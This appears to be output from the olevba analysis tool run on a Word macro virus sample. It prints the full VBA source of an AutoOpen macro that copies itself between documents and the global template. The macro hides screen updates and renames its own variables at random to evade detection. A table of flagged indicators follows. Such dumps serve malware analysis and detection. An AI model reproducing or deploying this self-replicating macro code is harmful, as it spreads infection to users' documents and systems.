olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.lv-a9a3bf3b3093c32a63fbb673a5834883766f558f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.lv-a9a3bf3b3093c32a63fbb673a5834883766f558f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.lv-a9a3bf3b3093c32a63fbb673a5834883766f558f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim DUHIM$
Dim DCLUL
Dim PPWMS
Dim A$
Dim B$
Dim C$
On Error Resume Next
WordBasic.ScreenUpdating 0
DUHIM$ = WordBasic.[FileName$]()
WordBasic.MacroCopy DUHIM$ + ":AutoOpen", "AutoOpen"
WordBasic.MacroCopy "AutoOpen", DUHIM$ + ":AutoOpen"
WordBasic.FileSaveAs Format:=1
DCLUL = WordBasic.Int(Rnd() * 3 + 5)
For PPWMS = 1 To DCLUL
A$ = A$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
B$ = B$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
C$ = C$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
Next PPWMS
WordBasic.ToolsMacro Name:="AutoOpen", Edit:=1
WordBasic.EditReplace Find:="DUHIM", Replace:=A$, ReplaceAll:=1
WordBasic.EditReplace Find:="PPWMS", Replace:=B$, ReplaceAll:=1
WordBasic.EditReplace Find:="DCLUL", Replace:=C$, ReplaceAll:=1
WordBasic.DocClose 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

